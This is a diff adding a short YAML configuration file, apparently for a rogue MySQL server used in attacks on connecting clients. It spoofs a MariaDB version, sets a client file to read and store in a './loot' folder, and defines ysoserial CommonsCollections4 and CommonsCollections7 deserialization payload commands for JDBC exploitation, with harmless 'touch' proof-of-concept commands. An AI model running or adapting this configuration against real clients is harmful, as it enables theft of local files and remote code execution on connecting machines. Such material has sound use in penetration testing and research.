@@ -1,0 +1,20 @@
+host: 0.0.0.0
+port: 3306
+version_string: "10.4.13-MariaDB-log"
+
+file_list: ["/tmp/top_secret_file.txt"]
+save_path: ./loot
+always_read: true
+from_database_name: false
+max_file_size: 0
+
+auth: false
+users:
+  - root: root
+  - root: password
+
+jdbc_exploit: false
+always_exploit: false
+ysoserial_command:
+  cc4: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections4", 'touch /tmp/cc4']
+  cc7: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections7", 'touch /tmp/cc7']
